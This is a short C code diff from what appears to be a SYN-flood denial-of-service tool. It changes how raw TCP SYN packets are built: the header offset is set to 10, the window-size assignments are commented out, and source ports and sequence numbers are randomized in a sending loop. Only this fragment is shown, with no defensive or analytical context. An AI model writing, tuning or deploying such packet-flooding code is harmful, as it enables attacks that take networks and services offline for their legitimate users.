@@ -335,14 +335,14 @@ int main(int argc, char *argv[]) {
 	tcph->dest = sin.sin_port;
 	tcph->seq = 0;
 	tcph->ack_seq = 0;
-	tcph->doff = 5; // TCP Header Size in 32-bit words (5-15)
+	tcph->doff = 10; // TCP Header Size in 32-bit words (5-15)
 	tcph->fin=0;
 	tcph->syn=1;
 	tcph->rst=0;
 	tcph->psh=0;
 	tcph->ack=0;
 	tcph->urg=0;
-	tcph->window = htons(65535); // Maximum possible window size (without scaling)
+	// tcph->window = htons(65535); // Maximum possible window size (without scaling)
 	tcph->check = 0;
 	tcph->urg_ptr = 0;
 
@@ -409,7 +409,7 @@ int main(int argc, char *argv[]) {
 		iph->check = 0;
 		iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
-		tcph->window = rand_next() & 0xffff;
+		// tcph->window = rand_next() & 0xffff;
 		tcph->source = rand_next() & 0xffff;
 		tcph->seq = rand_next() & 0xffff;
 		tcph->check = 0;
